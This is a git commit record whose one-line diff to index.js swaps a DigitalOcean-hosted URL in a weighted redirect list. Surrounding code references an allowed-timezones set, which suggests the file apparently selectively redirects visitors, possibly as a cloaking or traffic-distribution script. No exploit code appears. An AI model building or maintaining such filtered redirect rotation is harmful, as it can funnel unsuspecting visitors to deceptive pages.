61082a904608e848f8a7320738650a5200893a24
paalakash <palaksh452@gmail.com>
2026-07-20 12:56:39 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seal-app-2-n4ur3.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://clownfish-app-k3dnv.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
